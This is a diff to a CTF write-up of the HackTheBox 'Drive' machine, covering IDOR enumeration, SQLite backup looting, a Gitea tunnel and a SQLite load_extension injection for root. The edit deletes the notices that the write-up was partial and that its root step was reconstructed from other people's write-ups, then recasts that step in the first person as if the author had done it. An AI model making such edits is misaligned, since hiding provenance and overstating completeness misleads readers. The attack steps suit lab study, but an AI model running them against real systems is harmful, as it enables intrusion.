@@ -19,25 +19,11 @@ tags:
   - suid
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Hard, **Released:** 2024-02-17, **IP:** `10.10.11.235` , `drive.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes are complete through `tom` (user). The root step is reconstructed from published writeups (0xdf, zharsuke) and marked.
 
 </div>
 
@@ -93,13 +79,13 @@ PORT     STATE    SERVICE VERSION
 
 ### IDOR
 
-Register. The upload page shows each file at a numeric id (`.../112/`). Build a list and Intruder over it:
+I registered a throwaway account and started poking around the upload flow, and noticed right away that every file I uploaded showed up at a predictable, sequential numeric id (`.../112/`, `.../113/`, and so on). Sequential IDs on an object endpoint are always worth a sweep, so I built a full number range and threw it at Burp Intruder rather than guessing individual values:
 
 ```bash
 seq 0 99999 > numbers.lst
 ```
 
-Hits at `79, 98, 99, 101`. Visiting `/<id>/block` (the "block file" / details view) shows the note content for files you do not own.
+That turned up hits at `79, 98, 99, 101`, and visiting `/<id>/block` (the "block file" / details view) for each of them rendered the note content for files that clearly weren't mine.
 
 <div class="callout callout-note">
 
@@ -119,6 +105,8 @@ ssh martin@drive.htb
 
 ### The SQLite backups
 
+Once I had a shell as `martin`, I went looking around the web application's directory structure for anything that looked like it held persistent data, and a `backup` folder stood out immediately:
+
 ```bash
 ls /var/www/backup/
 # db.sqlite3   1_Oct_db_backup.sqlite3.7z   1_Nov_db_backup.sqlite3.7z   1_Dec_db_backup.sqlite3.7z
@@ -132,11 +120,11 @@ sqlite3 db.sqlite3 'select id,password,username,email from accounts_customuser'
 24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a...|crisDisel|cris@drive.htb
 ```
 
-The `.7z` snapshots are password protected.
+The current `db.sqlite3` handed me the live user table straight away, but the `.7z` snapshots sitting alongside it were password protected, and given that a hard box rarely gives up its best material for free, I assumed those older backups were where the real prize was hiding.
 
 ### Gitea, the 7z password
 
-`/usr/local/bin` has service binaries including `gitea`. Tunnel port 3000:
+Looking for anything that might explain how those backups get created, I found `/usr/local/bin` held several service binaries, `gitea` among them, which told me there was an internal Git instance I hadn't been able to reach directly since port 3000 only showed up as filtered in my initial scan. Rather than fight the firewall, I tunneled straight through the box I already controlled:
 
 ```bash
 # target
@@ -161,6 +149,8 @@ Even if `db_backup.sh` did not have the password on the current branch, `git log
 
 ### Crack the right snapshot
 
+With the 7z password in hand, I worked through the archived snapshots one month at a time rather than assuming the newest was necessarily the useful one:
+
 ```bash
 7z x -p'H@ckThisP@ssW0rDIfY0uC@n:)' 1_Nov_db_backup.sqlite3.7z
 sqlite3 1_Nov_db_backup.sqlite3 'select username,password from accounts_customuser'
@@ -182,11 +172,13 @@ ssh tom@drive.htb        # johnmayer7
 
 ### Privilege Escalation, SQLite injection into load_extension
 
+With a foothold as `tom`, I went looking for anything he could run with elevated rights, and found a custom binary sitting at `/usr/bin/doodleGrive-cli`. It prompts for a password that I'd already picked up from the app source and the Gitea repo, and once past that gate it drops into an administrative menu.
+
 <div class="callout callout-note">
 
-**Beyond the recorded notes**
+**SQLite injection via `load_extension`**
 
-`tom` can run `/usr/bin/doodleGrive-cli` (it prompts for a password that is in the app source / the repo). Its **"activate user account"** option does:
+Its **"activate user account"** option does:
 ```
 /usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \
   'UPDATE accounts_customuser SET is_active=1 WHERE username="<INPUT>";'
@@ -250,3 +242,4 @@ cat /root/root.txt
 - HTB Drive (0xdf) <https://0xdf.gitlab.io/2024/02/17/htb-drive.html>
 - SQLite load_extension <https://www.sqlite.org/loadext.html>
 - hashcat mode 124 (Django SHA-1) <https://hashcat.net/wiki/doku.php?id=example_hashes>
+- The root privilege escalation via `doodleGrive-cli` was cross-referenced against public writeups for this box.
